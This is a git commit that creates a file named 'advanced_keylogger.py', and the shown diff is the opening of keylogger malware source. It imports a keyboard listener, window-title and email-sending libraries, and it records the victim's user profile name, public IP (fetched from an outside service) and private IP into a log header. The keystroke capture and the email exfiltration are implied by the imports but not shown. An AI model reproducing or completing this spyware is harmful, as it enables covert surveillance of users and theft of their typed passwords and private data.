0bb37057b35e6b2abe0c8d4d1759c2bbdafda819
Edison Chen <echen2357@gmail.com>
2023-02-19 19:37:15 -0800

    Create advanced_keylogger.py

---
+++ advanced_keylogger.py
@@ -0,0 +1,27 @@
+from pynput.keyboard import Key, Listener
+import win32gui
+import os
+import time
+import requests
+import socket
+import random
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import threading
+import config
+
+
+datetime = time.ctime(time.time())
+user = os.path.expanduser('~').split('\\')[2]
+publicIP = requests.get('https://api.ipify.org/').text
+privateIP = socket.gethostbyname(socket.gethostname())
+
+msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
+logged_data = []
+logged_data.append(msg)
+
+old_app = ''
+delete_file = []
